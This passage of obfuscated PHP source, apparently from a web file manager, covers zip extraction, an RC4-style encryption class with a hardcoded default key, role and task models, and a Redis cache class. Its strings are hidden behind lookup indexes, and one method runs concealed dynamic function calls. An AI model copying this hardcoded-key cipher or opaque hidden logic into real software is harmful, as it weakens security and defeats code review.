get_path_father($F—‡Èï¯Œ); if ($d«ªˆÄø÷à == $F—‡Èï¯Œ) { $d«ªˆÄø÷à = $eÄÙ¯õÑœ[33]; } goto fä£Öîäóî; b˜ˆ²Ğçò: } goto E´“çŠùÍÜ; aœ¯«‚ší©: } static function fileIndex($CåêîªÄÉ, $bÍöŠ‡²² , $D»ïĞªå‘¥ = false) { goto C§¸¸œ÷Êê; C§¸¸œ÷Êê: $BµªŸŞ‹¿Ø =& $_SERVER[»„]; self::init(); if (!is_array($CåêîªÄÉ)) { return !1; } goto FÉ³¸ˆÒ›‹; añø¨ÒÃ: $a÷æÏĞÅÁ’ = $a·Ø”ºÈÓ°; if ($D»ïĞªå‘¥) { $a÷æÏĞÅÁ’ = $a·Ø”ºÈÓ°[$D»ïĞªå‘¥]; if ($a·Ø”ºÈÓ°[$BµªŸŞ‹¿Ø[76]]) { $a÷æÏĞÅÁ’ = rtrim($a÷æÏĞÅÁ’, $BµªŸŞ‹¿Ø[8]) . $BµªŸŞ‹¿Ø[8]; } } return $a÷æÏĞÅÁ’; goto aÎ¯éÑƒßŞ; FÉ³¸ˆÒ›‹: $bÌÉ¤Úğ = count($CåêîªÄÉ); for ($b°åíŸ±¯Ç = 0; $b°åíŸ±¯Ç < $bÌÉ¤Úğ; $b°åíŸ±¯Ç++) { if ($bÍöŠ‡²²  == $CåêîªÄÉ[$b°åíŸ±¯Ç][$BµªŸŞ‹¿Ø[1024]]) { $a·Ø”ºÈÓ° = $CåêîªÄÉ[$b°åíŸ±¯Ç]; break; } } if (!$a·Ø”ºÈÓ°) { show_tips($BµªŸŞ‹¿Ø[1894]); } goto añø¨ÒÃ; aÎ¯éÑƒßŞ: } static function extractZipFile($d˜öÏø†ø°, $AîáÜè¢„î, $fƒ»¹ËíÕ = false) { goto FÓ–ƒêÕ”‰; E£Ã“ÑáÁÓ: mk_dir($B†¼Åí¸í±); $d¤íéë§Ù = $B†¼Åí¸í± . md5($d˜öÏø†ø° . $AîáÜè¢„î); if ($fƒ»¹ËíÕ) { $d¤íéë§Ù = $B†¼Åí¸í± . $fƒ»¹ËíÕ; } goto Eàø™çÎ; Eàø™çÎ: if (file_exists($d¤íéë§Ù)) { return $d¤íéë§Ù; } $aÔ·´ãÆÈ = new PclZip($d˜öÏø†ø°); $aôÚ…ŞˆÓ‘ = unzip_filter_ext($B†¼Åí¸í± . get_path_this($AîáÜè¢„î)); goto DÓäÏ ‰ë¨; FÓ–ƒêÕ”‰: $d”õ¹µç… =& $_SERVER[»„]; self::init(); $B†¼Åí¸í± = TEMP_FILES . hash_path($d˜öÏø†ø°) . $d”õ¹µç…[8]; goto E£Ã“ÑáÁÓ; DÓäÏ ‰ë¨: $dŸÈ¢Àîâ“ = get_path_father($AîáÜè¢„î); if ($dŸÈ¢Àîâ“ == $AîáÜè¢„î) { $dŸÈ¢Àîâ“ = $d”õ¹µç…[33]; } $dÃëâ¢å¯ = $aÔ·´ãÆÈ->extract(PCLZIP_OPT_PATH, $B†¼Åí¸í±, PCLZIP_CB_PRE_FILE_NAME, $d”õ¹µç…[1892], PCLZIP_OPT_REMOVE_PATH, $dŸÈ¢Àîâ“, PCLZIP_OPT_BY_NAME, $AîáÜè¢„î); goto CÂ¯®Óƒ; CÂ¯®Óƒ: if (!file_exists($aôÚ…ŞˆÓ‘)) { return !1; } @rename($aôÚ…ŞˆÓ‘, $d¤íéë§Ù); return $d¤íéë§Ù; goto DÅ£‹è´„; DÅ£‹è´„: } static function filePreview($BëÇ®œ•¨», $BÛ†–£±Â–, $fâÌôÉÏİ = false, $E‹—´ÍİšÉ = false) { goto cÈ÷Á…ô’»; bÏÒ™á÷²: if (!file_exists($c½òŒ†ÖÓ“)) { del_dir($bµ·£æ¶Ãò); show_json($BÅñÅÈ¯Õ³[1897]); } IO::fileOut($c½òŒ†ÖÓ“, $fâÌôÉÏİ, $bè³‹æš‹); goto f¹¶êŞØ; cÈ÷Á…ô’»: $BÅñÅÈ¯Õ³ =& $_SERVER[»„]; self::init(); $bµ·£æ¶Ãò = TEMP_FILES . hash_path($BëÇ®œ•¨») . $BÅñÅÈ¯Õ³[8]; goto d‹·¨„¯ï’; d‹·¨„¯ï’: mk_dir($bµ·£æ¶Ãò); $c½òŒ†ÖÓ“ = $bµ·£æ¶Ãò . md5($BëÇ®œ•¨» . $BÛ†–£±Â– . $E‹—´ÍİšÉ); $Cö”¡’ßšğ = $BÅñÅÈ¯Õ³[33]; goto d‰ÑÑ§³‰½; F’…×åæ‹: if (!$B„¸Ìœ¿„‚[$BÅñÅÈ¯Õ³[1020]]) { show_json($B„¸Ìœ¿„‚[$BÅñÅÈ¯Õ³[1022]], !1); } if (!file_exists($A§°¨ğ‰)) { show_json($BÅñÅÈ¯Õ³[1896], !1); } @rename($A§°¨ğ‰, $c½òŒ†ÖÓ“); goto bÏÒ™á÷²; d‰ÑÑ§³‰½: $B„¸Ìœ¿„‚ = self::extract($BëÇ®œ•¨», $bµ·£æ¶Ãò, $BÛ†–£±Â–, $Cö”¡’ßšğ); if (is_array($Cö”¡’ßšğ)) { show_json($BÅñÅÈ¯Õ³[1895], !1); } if (file_exists($c½òŒ†ÖÓ“)) { IO::fileOut($c½òŒ†ÖÓ“, $fâÌôÉÏİ, get_path_this($Cö”¡’ßšğ)); return; } goto Aîµ‘ƒ®‡ó; Aîµ‘ƒ®‡ó: $Cö”¡’ßšğ = unzip_pre_name($Cö”¡’ßšğ); $bè³‹æš‹ = get_path_this($Cö”¡’ßšğ); $A§°¨ğ‰ = unzip_filter_ext($bµ·£æ¶Ãò . $bè³‹æš‹); goto F’…×åæ‹; f¹¶êŞØ: } static function create($CˆÛİóÁï, $fğÅˆ‚ô”) { $eç½ëèÆ– =& $_SERVER[»„]; self::init(); $A§¥›°ÓÌ = get_path_ext($CˆÛİóÁï); $eô †Œ¯‡î = !1; if (self::checkIfType($A§¥›°ÓÌ, $eç½ëèÆ–[297])) { if (kodZipArchive::support($eç½ëèÆ–[998])) { return kodZipArchive::create($CˆÛİóÁï, $fğÅˆ‚ô”); } $b÷±ìš = new PclZip($CˆÛİóÁï); foreach ($fğÅˆ‚ô” as $cÂ“İ¡ºØ => $c¹‰©¹‚–å) { $c¹‰©¹‚–å = str_replace($eç½ëèÆ–[463], $eç½ëèÆ–[8], $c¹‰©¹‚–å); $d¦ªòÇİ×ø = Kodio::clear(get_path_father($c¹‰©¹‚–å)); if ($cÂ“İ¡ºØ == 0) { $eô †Œ¯‡î = $b÷±ìš->create($c¹‰©¹‚–å, PCLZIP_OPT_REMOVE_PATH, $d¦ªòÇİ×ø, PCLZIP_CB_PRE_FILE_NAME, $eç½ëèÆ–[1898]); continue; } $eô †Œ¯‡î = $b÷±ìš->add($c¹‰©¹‚–å, PCLZIP_OPT_REMOVE_PATH, $d¦ªòÇİ×ø, PCLZIP_CB_PRE_FILE_NAME, $eç½ëèÆ–[1898]); } } else { if (self::checkIfType($A§¥›°ÓÌ, $eç½ëèÆ–[1869])) { foreach ($fğÅˆ‚ô” as $cÂ“İ¡ºØ => $c¹‰©¹‚–å) { $c¹‰©¹‚–å = str_replace($eç½ëèÆ–[463], $eç½ëèÆ–[8], $c¹‰©¹‚–å); $d¦ªòÇİ×ø = Kodio::clear(get_path_father($c¹‰©¹‚–å)); if ($cÂ“İ¡ºØ == 0) { $eô †Œ¯‡î = PclTarCreate($CˆÛİóÁï, array($c¹‰©¹‚–å), $A§¥›°ÓÌ, null, $d¦ªòÇİ×ø); continue; } $eô †Œ¯‡î = PclTarAddList($CˆÛİóÁï, array($c¹‰©¹‚–å), $eç½ëèÆ–[33], $d¦ªòÇİ×ø, $A§¥›°ÓÌ); } } } return $eô †Œ¯‡î; } } goto eŠÂÛåÏ¤‚; eŠÂÛåÏ¤‚: class Mcrypt { public static $defaultKey = "\x61\41\164\141\x6b\101\x3a\144\154\155\143\x6c\144\x45\166\54\x65"; public static function encode($a°ğ™†ù­…, $F¾ÌŞ£’¥Ñ = '', $d™”ï¹«‡Ç = 0, $CÑ·ÑÁ»†© = '') { goto cÎİñê¸‡; F›æ…÷¶ù: $aƒ‰Ì«¦“ = substr($CÑ·ÑÁ»†©, -$cŞäë÷ë¾Ğ); $DŞ•ßÃÄ«ö = $D¹éİÀÒ­’ . md5($D¹éİÀÒ­’ . $aƒ‰Ì«¦“); $dÖ¡Òõö¦ = strlen($DŞ•ßÃÄ«ö); goto Fì‚…™Ä£; cÎİñê¸‡: $b·ÏŒŸ«°– =& $_SERVER[»„]; $cŞäë÷ë¾Ğ = 4; $F¾ÌŞ£’¥Ñ = md5($F¾ÌŞ£’¥Ñ ? $F¾ÌŞ£’¥Ñ : self::$defaultKey); goto fÎ‘îÒªèö; Fì‚…™Ä£: $a°ğ™†ù­… = sprintf($b·ÏŒŸ«°–[1899], $d™”ï¹«‡Ç ? $d™”ï¹«‡Ç + time() : 0) . substr(md5($a°ğ™†ù­… . $Cäøœç„»ß), 0, 16) . $a°ğ™†ù­…; $dİÂêò½‘Å = strlen($a°ğ™†ù­…); $b¿¾ÀÌŠÓø = array(); goto fÎäƒš¾Ô¬; fÎäƒš¾Ô¬: for ($F¬–¥†È‡ = 0; $F¬–¥†È‡ <= 255; $F¬–¥†È‡++) { $b¿¾ÀÌŠÓø[$F¬–¥†È‡] = ord($DŞ•ßÃÄ«ö[$F¬–¥†È‡ % $dÖ¡Òõö¦]); } $eäÙ¬Ú¬Ğ­ = range(0, 255); for ($Aãó¦®‡’ = $F¬–¥†È‡ = 0; $F¬–¥†È‡ < 256; $F¬–¥†È‡++) { $Aãó¦®‡’ = ($Aãó¦®‡’ + $eäÙ¬Ú¬Ğ­[$F¬–¥†È‡] + $b¿¾ÀÌŠÓø[$F¬–¥†È‡]) % 256; $BìŞ®Š§£’ = $eäÙ¬Ú¬Ğ­[$F¬–¥†È‡]; $eäÙ¬Ú¬Ğ­[$F¬–¥†È‡] = $eäÙ¬Ú¬Ğ­[$Aãó¦®‡’]; $eäÙ¬Ú¬Ğ­[$Aãó¦®‡’] = $BìŞ®Š§£’; } goto A“ÛÊï¾Å¦; A“ÛÊï¾Å¦: $d™çó—‚Ã½ = $b·ÏŒŸ«°–[33]; for ($B ‡³ğƒš¾ = $Aãó¦®‡’ = $F¬–¥†È‡ = 0; $F¬–¥†È‡ < $dİÂêò½‘Å; $F¬–¥†È‡++) { $B ‡³ğƒš¾ = ($B ‡³ğƒš¾ + 1) % 256; $Aãó¦®‡’ = ($Aãó¦®‡’ + $eäÙ¬Ú¬Ğ­[$B ‡³ğƒš¾]) % 256; $BìŞ®Š§£’ = $eäÙ¬Ú¬Ğ­[$B ‡³ğƒš¾]; $eäÙ¬Ú¬Ğ­[$B ‡³ğƒš¾] = $eäÙ¬Ú¬Ğ­[$Aãó¦®‡’]; $eäÙ¬Ú¬Ğ­[$Aãó¦®‡’] = $BìŞ®Š§£’; $d™çó—‚Ã½ .= chr(ord($a°ğ™†ù­…[$F¬–¥†È‡]) ^ $eäÙ¬Ú¬Ğ­[($eäÙ¬Ú¬Ğ­[$B ‡³ğƒš¾] + $eäÙ¬Ú¬Ğ­[$Aãó¦®‡’]) % 256]); } $d™çó—‚Ã½ = $aƒ‰Ì«¦“ . str_replace($b·ÏŒŸ«°–[897], $b·ÏŒŸ«°–[33], base64_encode($d™çó—‚Ã½)); goto AŒâ‡Ñ½’; AŒâ‡Ñ½’: $d™çó—‚Ã½ = str_replace(array($b·ÏŒŸ«°–[280], $b·ÏŒŸ«°–[8], $b·ÏŒŸ«°–[897]), array($b·ÏŒŸ«°–[408], $b·ÏŒŸ«°–[70], $b·ÏŒŸ«°–[91]), $d™çó—‚Ã½); return $d™çó—‚Ã½; goto dÅ¶™æ»Â‚; fÎ‘îÒªèö: $D¹éİÀÒ­’ = md5(substr($F¾ÌŞ£’¥Ñ, 0, 16)); $Cäøœç„»ß = md5(substr($F¾ÌŞ£’¥Ñ, 16, 16)); $CÑ·ÑÁ»†© = $CÑ·ÑÁ»†© ? $CÑ·ÑÁ»†© : md5(microtime()); goto F›æ…÷¶ù; dÅ¶™æ»Â‚: } public static function decode($f®„œìğÏ, $aäô¬Ç­› = '') { goto Dô÷ëõºÊË; Dä“æ´ß½: $f®„œìğÏ = base64_decode(substr($f®„œìğÏ, $Aµ‡ß±¦ºÌ)); $b‰ğ¢©ï“ = strlen($f®„œìğÏ); $AƒöªÇ¢³Ò = array(); goto eµ¢‹©¹Ü; f‹Ì‚•½šÃ: $aäô¬Ç­› = md5($aäô¬Ç­› ? $aäô¬Ç­› : self::$defaultKey); $E¯Œ—ù¢Â‹ = md5(substr($aäô¬Ç­›, 0, 16)); $E‘¤Š¢¯Şœ = md5(substr($aäô¬Ç­›, 16, 16)); goto a¡Ô›¦’Šç; a¡Ô›¦’Šç: $c²•×ËÚÇÏ = substr($f®„œìğÏ, 0, $Aµ‡ß±¦ºÌ); $EÆÍÍÁ×´Í = $E¯Œ—ù¢Â‹ . md5($E¯Œ—ù¢Â‹ . $c²•×ËÚÇÏ); $bÚ²µÑï©ƒ = strlen($EÆÍÍÁ×´Í); goto Dä“æ´ß½; e­½ßÇ•ï¸: $bäÅªáÚ…º = $D½õôˆà[33]; for ($BÅíÒéÃ•™ = $a¯¶Õ×¾¹é = $dÅ„ßøåö = 0; $dÅ„ßøåö < $b‰ğ¢©ï“; $dÅ„ßøåö++) { $BÅíÒéÃ•™ = ($BÅíÒéÃ•™ + 1) % 256; $a¯¶Õ×¾¹é = ($a¯¶Õ×¾¹é + $A–œÀ±ƒË›[$BÅíÒéÃ•™]) % 256; $d„Ü‡§Ïà“ = $A–œÀ±ƒË›[$BÅíÒéÃ•™]; $A–œÀ±ƒË›[$BÅíÒéÃ•™] = $A–œÀ±ƒË›[$a¯¶Õ×¾¹é]; $A–œÀ±ƒË›[$a¯¶Õ×¾¹é] = $d„Ü‡§Ïà“; $bäÅªáÚ…º .= chr(ord($f®„œìğÏ[$dÅ„ßøåö]) ^ $A–œÀ±ƒË›[($A–œÀ±ƒË›[$BÅíÒéÃ•™] + $A–œÀ±ƒË›[$a¯¶Õ×¾¹é]) % 256]); } $FœÓ”¹ÔÌ = intval(substr($bäÅªáÚ…º, 0, 10)); goto E‰¨ˆè›ˆæ; Dô÷ëõºÊË: $D½õôˆà =& $_SERVER[»„]; $f®„œìğÏ = str_replace(array($D½õôˆà[408], $D½õôˆà[70], $D½õôˆà[91]), array($D½õôˆà[280], $D½õôˆà[8], $D½õôˆà[897]), $f®„œìğÏ); $Aµ‡ß±¦ºÌ = 4; goto f‹Ì‚•½šÃ; eµ¢‹©¹Ü: for ($dÅ„ßøåö = 0; $dÅ„ßøåö <= 255; $dÅ„ßøåö++) { $AƒöªÇ¢³Ò[$dÅ„ßøåö] = ord($EÆÍÍÁ×´Í[$dÅ„ßøåö % $bÚ²µÑï©ƒ]); } $A–œÀ±ƒË› = range(0, 255); for ($a¯¶Õ×¾¹é = $dÅ„ßøåö = 0; $dÅ„ßøåö < 256; $dÅ„ßøåö++) { $a¯¶Õ×¾¹é = ($a¯¶Õ×¾¹é + $A–œÀ±ƒË›[$dÅ„ßøåö] + $AƒöªÇ¢³Ò[$dÅ„ßøåö]) % 256; $d„Ü‡§Ïà“ = $A–œÀ±ƒË›[$dÅ„ßøåö]; $A–œÀ±ƒË›[$dÅ„ßøåö] = $A–œÀ±ƒË›[$a¯¶Õ×¾¹é]; $A–œÀ±ƒË›[$a¯¶Õ×¾¹é] = $d„Ü‡§Ïà“; } goto e­½ßÇ•ï¸; E‰¨ˆè›ˆæ: if (($FœÓ”¹ÔÌ == 0 || $FœÓ”¹ÔÌ - time() > 0) && substr($bäÅªáÚ…º, 10, 16) == substr(md5(substr($bäÅªáÚ…º, 26) . $E‘¤Š¢¯Şœ), 0, 16)) { return substr($bäÅªáÚ…º, 26); } else { return $D½õôˆà[33]; } goto eÚ‘äÉ¿¥; eÚ‘äÉ¿¥: } } define($_SERVER[»„][1900], 1); define($_SERVER[»„][1901], 2); goto D¥âœ¬ƒ; eŸÓ‚‘ôÔ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x72\157\154\x65\x4c\x69\x73\164"; public $field = array("\156\141\x6d\x65", "\x61\165\164\150", "\x6c\141\142\x65\154", "\x64\151\163\160\x6c\x61\x79", "\x73\171\x73\x74\145\x6d", "\144\x65\163\143", "\x69\147\156\x6f\x72\145\105\x78\164", "\x69\147\x6e\x6f\x72\x65\106\x69\x6c\x65\x53\x69\172\145", "\x61\144\155\x69\x6e\x69\x73\164\x72\141\164\x6f\162", "\x73\x6f\x72\x74"); public function listData($a—‰—×à†™ = false, $cˆô›¿²Ó— = "\x73\x6f\x72\x74", $dÎ™á»¿Ã = false) { return parent::listData($a—‰—×à†™, $cˆô›¿²Ó—, $dÎ™á»¿Ã); } public function update($eîÃ §‰ŒÏ, $EØ·ÔµÖ‹) { goto d‹£êšÓÈ; d‹£êšÓÈ: $cµâ¬èÚ‰Ö =& $_SERVER[»„]; $e•Îóœç… = parent::listData($eîÃ §‰ŒÏ); $FÕŒÑõÉ‚ì = $this->findByName($EØ·ÔµÖ‹[$cµâ¬èÚ‰Ö[28]]); goto F“İ–Û¯­; F“İ–Û¯­: if (!$e•Îóœç… || $FÕŒÑõÉ‚ì && $FÕŒÑõÉ‚ì[$cµâ¬èÚ‰Ö[363]] != $e•Îóœç…[$cµâ¬èÚ‰Ö[363]]) { return !1; } if ($FÕŒÑõÉ‚ì[$cµâ¬èÚ‰Ö[2448]] == 1) { $EØ·ÔµÖ‹ = array($cµâ¬èÚ‰Ö[28] => $EØ·ÔµÖ‹[$cµâ¬èÚ‰Ö[28]], $cµâ¬èÚ‰Ö[2090] => $EØ·ÔµÖ‹[$cµâ¬èÚ‰Ö[2090]]); } $this->filterAuth($EØ·ÔµÖ‹[$cµâ¬èÚ‰Ö[372]]); goto a¦Îª’äÇ; a¦Îª’äÇ: return parent::update($eîÃ §‰ŒÏ, $EØ·ÔµÖ‹); goto d‰µ£Ëš¼; d‰µ£Ëš¼: } public function remove($bñé‡æµÑ) { $BÁ‡å„é± = parent::listData($bñé‡æµÑ); if (!$BÁ‡å„é± || $BÁ‡å„é±[$_SERVER[»„][1068]]) { return !1; } return parent::remove($bñé‡æµÑ); } public function add($c‡‹ç°°æï) { goto Aì„øÓÁ‹; Aì„øÓÁ‹: $A›‹¥íÃõå =& $_SERVER[»„]; $BÄ‰åæïÒ = $c‡‹ç°°æï[$A›‹¥íÃõå[28]]; if ($this->findByName($BÄ‰åæïÒ)) { return !1; } goto BšÙ…ª ÚÀ; BšÙ…ª ÚÀ: $câÔ‹¼òé¦ = array($A›‹¥íÃõå[382] => $BÄ‰åæïÒ, $A›‹¥íÃõå[2078] => $A›‹¥íÃõå[33], $A›‹¥íÃõå[2074] => $A›‹¥íÃõå[2091], $A›‹¥íÃõå[2449] => 1, $A›‹¥íÃõå[2077] => 0, $A›‹¥íÃõå[2450] => 0, $A›‹¥íÃõå[2076] => $this->getSort()); $c‡‹ç°°æï = array_merge($câÔ‹¼òé¦, $c‡‹ç°°æï); $this->filterAuth($c‡‹ç°°æï[$A›‹¥íÃõå[372]]); goto e¿Éã¹«”Ù; e¿Éã¹«”Ù: return parent::insert($c‡‹ç°°æï); goto B¨Œ¿ç¿µ; B¨Œ¿ç¿µ: } private function getSort() { $C·°Û¦·« =& $_SERVER[»„]; $CÖùƒ×öÂé = parent::listData(); $Eˆİ ¾¾–½ = array_to_keyvalue($CÖùƒ×öÂé, $C·°Û¦·«[33], $C·°Û¦·«[2093]); return empty($Eˆİ ¾¾–½) ? 0 : max($Eˆİ ¾¾–½) + 1; } private function filterAuth(&$BØÍ¡ÈòÓÀ) { $aØ´‘îİ·¦ =& $_SERVER[»„]; $D÷¤Ó¬§¹¤ = array(); $AÈÀ¡¬Ê× = array_filter(explode($aØ´‘îİ·¦[47], $BØÍ¡ÈòÓÀ)); foreach ($AÈÀ¡¬Ê× as $BØÍ¡ÈòÓÀ) { $cœ‘Î†ªŠ§ = explode($aØ´‘îİ·¦[91], $BØÍ¡ÈòÓÀ); if ($cœ‘Î†ªŠ§[0] == $aØ´‘îİ·¦[1752] && $cœ‘Î†ªŠ§[1] != $aØ´‘îİ·¦[1024]) { $aÜÎöŒ©ŒĞ = $cœ‘Î†ªŠ§[0] . $aØ´‘îİ·¦[91] . $cœ‘Î†ªŠ§[1] . $aØ´‘îİ·¦[2451]; if (!in_array($aÜÎöŒ©ŒĞ, $AÈÀ¡¬Ê×)) { $D÷¤Ó¬§¹¤[] = $aÜÎöŒ©ŒĞ; } } $D÷¤Ó¬§¹¤[] = $BØÍ¡ÈòÓÀ; } $BØÍ¡ÈòÓÀ = implode($aØ´‘îİ·¦[47], $D÷¤Ó¬§¹¤); } public function sort($AğçøÑ¤ø“, $f‡æï¼„“) { return parent::update($AğçøÑ¤ø“, $f‡æï¼„“); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\164\x61\x73\x6b\x4c\151\x73\164"; public $field = array("\156\x61\x6d\x65", "\164\171\160\145", "\145\x76\x65\x6e\164", "\164\151\x6d\145", "\144\145\x73\x63", "\x73\171\163\164\145\155", "\x65\x6e\x61\142\x6c\145", "\154\141\x73\164\x52\165\x6e", "\163\x6f\162\x74"); public function listData($dô± ‡í¡œ = false, $b·ªù¿“† = "\163\157\162\x74", $aäİ³ ½ = false) { return parent::listData($dô± ‡í¡œ, $b·ªù¿“†, $aäİ³ ½); } public function add($d®µÉË÷ ) { $EÕ™ß‘«»² =& $_SERVER[»„]; $bØø‡âÖè = $this->findByName($d®µÉË÷ [$EÕ™ß‘«»²[28]]); if ($bØø‡âÖè) { return !1; } $d®µÉË÷ [$EÕ™ß‘«»²[1374]] = 0; $d®µÉË÷ [$EÕ™ß‘«»²[2093]] = $this->getSort(); return parent::insert($d®µÉË÷ ); } private function getSort() { $bØÔ…§ÊÌ =& $_SERVER[»„]; $b®Ö¶¸ãó¢ = parent::listData(); $fÇã­É‘Ö¤ = array_to_keyvalue($b®Ö¶¸ãó¢, $bØÔ…§ÊÌ[33], $bØÔ…§ÊÌ[2093]); return empty($fÇã­É‘Ö¤) ? 0 : max($fÇã­É‘Ö¤) + 1; } public function update($fÌ¸»µñÜó, $bˆ´ Òóíª) { $dÔ¥õö¶Íé =& $_SERVER[»„]; $C°ÈØ½¢Ï¢ = $this->listData($fÌ¸»µñÜó); $F¯ùĞ¸ÃêÇ = $this->findByName($bˆ´ Òóíª[$dÔ¥õö¶Íé[28]]); if (!$C°ÈØ½¢Ï¢ || $F¯ùĞ¸ÃêÇ && $F¯ùĞ¸ÃêÇ[$dÔ¥õö¶Íé[363]] != $C°ÈØ½¢Ï¢[$dÔ¥õö¶Íé[363]]) { return !1; } return parent::update($fÌ¸»µñÜó, $bˆ´ Òóíª); } public function remove($aÖõ†ï«‡, $BäÌ…‹á¯ = false) { $BñèìÔ­•º =& $_SERVER[»„]; $Fºæ†İÕÚó = $this->listData($aÖõ†ï«‡); if (!$Fºæ†İÕÚó) { return; } if (!$BäÌ…‹á¯ && $Fºæ†İÕÚó[$BñèìÔ­•º[1068]] == $BñèìÔ­•º[83]) { return !1; } return parent::remove($aÖõ†ï«‡); } public function enable($Bô©¸öï£, $DÑ½¼øá­¥) { return $this->update($Bô©¸öï£, array($_SERVER[»„][2442] => $DÑ½¼øá­¥)); } public function run($f“ÂØç†ô) { return $this->update($f“ÂØç†ô, array($_SERVER[»„][2452] => time())); } } goto c® ””Ô…Œ; D¥âœ¬ƒ: define($_SERVER[»„][1902], 3); define($_SERVER[»„][1903], 4); define($_SERVER[»„][1904], 5); goto cÏê‚ÒÅóÏ; E×¯óÙ«Å­: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($a§­š¿êç„, $c‰…¯è„‡) { $Añ¶—îÜë‡ =& $_SERVER[»„]; if (!class_exists($Añ¶—îÜë‡[775])) { show_json($Añ¶—îÜë‡[776], !1); } $this->cacheTime = $c‰…¯è„‡; $E—ì…÷•ï = isset($a§­š¿êç„[$Añ¶—îÜë‡[777]]) ? $a§­š¿êç„[$Añ¶—îÜë‡[777]] : 10; $E©†îòÛ˜ = _get($a§­š¿êç„, $Añ¶—îÜë‡[774]); if ($E©†îòÛ˜ && is_array($E©†îòÛ˜)) { $this->initCluster($a§­š¿êç„, $E—ì…÷•ï); } else { $this->handle = $this->init($a§­š¿êç„, $E—ì…÷•ï); } } private function init($B°ÈÎ’´ÆÏ, $fİÌ¡ƒäë) { $B‹¯Şñƒ´‡ =& $_SERVER[»„]; $EÓĞ³…ÃÏ = new Redis(); $E©İ‡Üô“˜ = isset($B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[778]]) ? $B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[778]] : !1; if ($E©İ‡Üô“˜) { $EÓĞ³…ÃÏ->pconnect($B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[165]], $B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[166]], $fİÌ¡ƒäë); } else { $EÓĞ³…ÃÏ->connect($B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[165]], $B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[166]], $fİÌ¡ƒäë); } if (!empty($B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[372]])) { $EÓĞ³…ÃÏ->auth($B°ÈÎ’´ÆÏ[$B‹¯Şñƒ´‡[372]]); } return $EÓĞ³…ÃÏ; } private function initCluster($C›¨Òñ¶Œ, $eÑİÜõù¼®) { $E ù‘²’ö =& $_SERVER[»„]; $A›šïº³™â = array($E ù‘²’ö[779], $E ù‘²’ö[780], $E ù‘²’ö[781]); $fŠó½Şò» = $E ù‘²’ö[779]; if (isset($C›¨Òñ¶Œ[$E ù‘²’ö[12]]) && in_array($C›¨Òñ¶Œ[$E ù‘²’ö[12]], $A›šïº³™â)) { $fŠó½Şò» = $C›¨Òñ¶Œ[$E ù‘²’ö[12]]; } switch ($fŠó½Şò») { case $E ù‘²’ö[779]: $this->_slave($C›¨Òñ¶Œ, $eÑİÜõù¼®); break; case $E ù‘²’ö[780]: break; case $E ù‘²’ö[781]: $this->isCluster = !0; $F¶é¢°ÛÅ = $C›¨Òñ¶Œ[$E ù‘²’ö[774]]; $B±ƒ‡œªê = isset($C›¨Òñ¶Œ[$E ù‘²’ö[778]]) ? $C›¨Òñ¶Œ[$E ù‘²’ö[778]] : !1; $AÄõÃÖ¡Ç = isset($C›¨Òñ¶Œ[$E ù‘²’ö[372]]) ? $C›¨Òñ¶Œ[$E ù‘²’ö[372]] : null; $this->handle = new RedisCluster(NUll, $F¶é¢°ÛÅ, $eÑİÜõù¼®, $eÑİÜõù¼®, $B±ƒ‡œªê, $AÄõÃÖ¡Ç); break; default: break; } } private function _slave($d›©ó£Ãà, $b…ç·ƒ÷ëà) { goto EøáÇÂ²µ°; FğÇË×Ããë: unset($fŸï£î‰à[0]); if (empty($fŸï£î‰à)) { return; } $B”Œ´¦ÕÙ = array_rand($fŸï£î‰à); goto CĞÕÈ–¡¤´; EøáÇÂ²µ°: $fŸï£î‰à = $d›©ó£Ãà[$_SERVER[»„][774]]; $this->filterConfig($d›©ó£Ãà, $fŸï£î‰à[0]); $this->handle = $this->init($d›©ó£Ãà, $b…ç·ƒ÷ëà); goto FğÇË×Ããë; CĞÕÈ–¡¤´: $this->filterConfig($d›©ó£Ãà, $fŸï£î‰à[$B”Œ´¦ÕÙ]); $this->slaveHandle = $this->init($d›©ó£Ãà, $b…ç·ƒ÷ëà); goto EÜ²ÀŠ£¥ä; EÜ²ÀŠ£¥ä: } private function filterConfig(&$BÁ‚±²›Š, $bù§­âÚ¦Û) { $B…î¦ââ©¾ =& $_SERVER[»„]; $CÇ„¯šã±¦ = explode($B…î¦ââ©¾[4], $bù§­âÚ¦Û); $a«Š¥å¢İ´ = array($B…î¦ââ©¾[165] => $CÇ„¯šã±¦[0], $B…î¦ââ©¾[166] => $CÇ„¯šã±¦[1]); $BÁ‚±²›Š = array_merge($BÁ‚±²›Š, $a«Š¥å¢İ´); } public function set($A”‚“”ÜÏ, $fíç¹ï¡„‡, $F‡±µŒ™Ùá = false) { $F‡±µŒ™Ùá = $F‡±µŒ™Ùá ? $F‡±µŒ™Ùá : $this->cacheTime; return $this->handle->setEx($A”‚“”ÜÏ, $F‡±µŒ™Ùá, $fíç¹ï¡„‡); } public function setLock($Dğ“´Ó­Šæ, $cªÁ™‹¾øÉ, $CŒ›Ì¡¸Ò¿) { return $this->handle->setNX($Dğ“´Ó­Šæ, $cªÁ™‹¾øÉ); } public function get($aµÖ±ìÜèÂ) { $F§›•Œ£„ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $F§›•Œ£„->get($aµÖ±ìÜèÂ); } public function remove($eà™£ï±ÙÔ) { return $this->handle->del($eà™£ï±ÙÔ); } public function deleteAll() { $eíĞ†ô¡ğõ =& $_SERVER[»„]; if ($_SERVER[$eíĞ†ô¡ğõ[750]] != $_SERVER[$eíĞ†ô¡ğõ[782]]) { goto BŒîåø¥†; BÁ½Ë‚ß‡‘: $Fùê“„©Ë = $F‰Šõ÷ŒÓ($dòêôİğã); $aÉô’†ÄŒ = explode($eíĞ†ô¡ğõ[213], $Fùê“„©Ë); if (count($aÉô’†ÄŒ) < $eíĞ†ô¡ğõ[554]) { $dÂ¿½¤îñ£ = $eíĞ†ô¡ğõ[754]; $dÂ¿½¤îñ£(); } goto FÅÖŠí™—Ö; FÅÖŠí™—Ö: $d™ˆâ«»Ïß = 